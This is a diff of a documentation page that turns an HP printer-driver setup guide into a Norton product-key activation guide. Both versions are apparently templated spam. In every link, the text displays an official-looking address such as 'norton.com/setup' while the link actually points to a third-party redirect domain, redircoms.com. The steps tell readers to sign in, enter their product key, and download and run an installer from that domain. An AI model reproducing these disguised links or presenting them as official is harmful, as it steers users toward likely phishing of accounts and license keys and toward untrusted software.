@@ -1,5 +1,5 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+How Do I Enter Norton Product Key at Norton.com/setup
 ##################
 
 .. meta::
@@ -14,8 +14,8 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
       :width: 350px
       :align: center
       :height: 100px
-      :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+      :alt: norton.com/setup
+      :target: https://nt.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -28,46 +28,46 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
 
 
 
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+There are 5 simple stages to enter your Norton product key and activate your subscription at `norton.com/setup <https://nt.redircoms.com>`_. Norton’s setup site makes activation easy and secure. It’s the fastest way to ensure your device is protected with the latest security features. Visit `norton.com/setup <https://nt.redircoms.com>`_, enter your product key, and get started in minutes.
 
 **********
-Steps to Download HP Printer Driver
+Steps to Enter Norton Product Key
 **********
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
+1. Open a web browser and go to `norton.com/setup <https://nt.redircoms.com>`_.
 
-2. Enter your HP printer model in the search box.
+2. Sign in to your Norton account. If you don’t have one, create a new account.
 
-3. Select your operating system if prompted.
+3. Locate your 25-character Norton product key.
 
-4. Click on **Download** to get the latest driver and software package.
+4. Enter the product key in the field provided.
 
-5. Save the installer file to your computer.
-
-**********
-Steps to Install HP Printer Driver
-**********
-
-1. Locate the downloaded installer file on your computer.
-
-2. Double-click the installer to begin the setup process.
-
-3. Follow the on-screen instructions and accept the license agreement.
-
-4. Choose your connection type (USB or Wireless).
-
-5. Complete the installation by clicking **Finish**.
+5. Click **Submit** to redeem and activate your subscription.
 
 **********
-Setting Up Your HP Printer
+Steps to Download Norton Setup
 **********
 
-1. Make sure your HP printer is powered on.
+1. After entering your product key, you’ll see a **Download** option.
 
-2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
+2. Click **Download** to get the Norton installer.
 
-3. Open the HP driver or utility you installed.
+3. Save the installer file to your computer.
 
-4. Follow on-screen prompts to detect and connect your printer.
+4. Double-click the installer to start the installation process.
 
-5. Once connected, print a test page to verify setup is complete.
+5. Follow on-screen instructions to complete setup.
+
+**********
+Activating Norton on Your Device
+**********
+
+1. Make sure your device meets the system requirements.
+
+2. Launch the Norton software you installed.
+
+3. Sign in with your Norton account if prompted.
+
+4. The software will automatically verify your subscription.
+
+5. Once activated, run a **Quick Scan** to confirm protection is enabled.
